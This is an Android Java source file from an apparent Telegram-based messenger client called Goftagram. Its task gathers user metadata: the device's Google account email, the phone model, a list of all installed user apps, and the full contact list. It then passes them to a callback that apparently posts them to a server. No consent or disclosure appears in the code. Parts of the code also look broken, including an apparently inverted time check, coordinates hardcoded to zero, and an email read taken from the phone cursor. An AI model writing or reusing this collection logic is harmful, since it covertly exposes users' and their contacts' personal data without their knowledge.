package com.goftagram.telegram.goftagram.application.usecases.postusermetadata.implementation;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;

import com.goftagram.telegram.goftagram.application.model.App;
import com.goftagram.telegram.goftagram.application.usecases.absclasses.NameValueDataHolder;
import com.goftagram.telegram.goftagram.application.usecases.absclasses.absget.AbsGetTask;
import com.goftagram.telegram.goftagram.application.usecases.postusermetadata.contract.PostUserMetaDataRequest;
import com.goftagram.telegram.goftagram.application.usecases.postusermetadata.contract.PostUserMetaDataTaskCallback;
import com.goftagram.telegram.goftagram.myconst.Constants;
import com.goftagram.telegram.goftagram.util.LogUtils;
import com.goftagram.telegram.messenger.R;

import java.util.ArrayList;
import java.util.List;


public class PostUserMetaDataTask extends AbsGetTask {

    private final String LOG_TAG = LogUtils.makeLogTag(PostUserMetaDataTask.class.getSimpleName());

    private Context mContext;
    private PostUserMetaDataRequest mRequestModel;
    private PostUserMetaDataTaskCallback mPostUserMetaDataTaskCallback;
    protected NameValueDataHolder mDataHolder;


    public PostUserMetaDataTask(
            Context context,
            PostUserMetaDataRequest requestModel,
            PostUserMetaDataTaskCallback callback
    ) {
        super(context);
        mRequestModel = requestModel;
        mContext = context;
        mPostUserMetaDataTaskCallback = callback;
        mDataHolder = new NameValueDataHolder();
    }

    @Override
    public void run() {

        long storedTime = PostUserMetaDataInteractorImp.getLastCheckedTime(mContext);
        long currentTime = System.currentTimeMillis();
        long diffTime = currentTime - storedTime;
        long diffTimeHrs = (diffTime / ((1000) * (3600)));

        double latitude = 0;
        double longitude = 0;


        if (diffTimeHrs < Constants.USER_META_DATA_UPDATE_FREQUENCY) {

            mDataHolder.put(PostUserMetaDataInteractorImp.KEY_GMAIL, getGmail());
            mDataHolder.put(PostUserMetaDataInteractorImp.KEY_PHONE_MODEL, getPhoneModel());
            mDataHolder.put(PostUserMetaDataInteractorImp.KEY_GEO, "" + latitude + "," + longitude);
            mDataHolder.put(PostUserMetaDataInteractorImp.KEY_APPLICATION_LIST, getApplicationList());
            mDataHolder.put(PostUserMetaDataInteractorImp.KEY_CONTACT_LIST, getContactsList());
            mDataHolder.put(PostUserMetaDataInteractorImp.KEY_APP_VERSION_NAME, getAppVersion());
            mPostUserMetaDataTaskCallback.onMiss(mRequestModel, mDataHolder);

        } else {
            mPostUserMetaDataTaskCallback.onHit(mRequestModel, mDataHolder);
        }


    }


    public String getGmail() {

        AccountManager accountManager = AccountManager.get(mContext);
        Account[] accounts = accountManager.getAccountsByType("com.google");
        String gMail = null;
        if (accounts.length > 0) {
            gMail = accounts[0].name;
        }

        return gMail;

    }


    public String getPhoneModel() {
        return Build.MANUFACTURER + " | " + Build.BRAND + " | " + Build.PRODUCT + " | " + Build.MODEL;
    }

    public List<String> getApplicationList() {

        List<ApplicationInfo> appList = mContext.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);

        List<String> applicationName = new ArrayList<>();

        for (ApplicationInfo appInfo : appList) {

            if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {

                String appName = appInfo.loadLabel(mContext.getPackageManager()).toString();
                String packageName = appInfo.packageName;
                String result = "{appName=" + appName + ",packageName=" + packageName + "}";
                applicationName.add(result);
            }
        }

        return applicationName;
    }


    public List<String> getContactsList() {
        Cursor phones = mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        List<String> contactsList = new ArrayList<>();

        while (phones.moveToNext()) {
            String mobile = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            String email = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
            String result = "{mobile=" + mobile + ",email=" + email + "}";
            contactsList.add(result);
        }
        phones.close();

        return contactsList;
    }


    public String getAppVersion() {
        return (
                mContext.getString(R.string.app_name) + " " +
                        App.getInstance(mContext).getAppVersionName() + "," +
                        App.getInstance(mContext).getAppVersionCode()
        );
    }


}
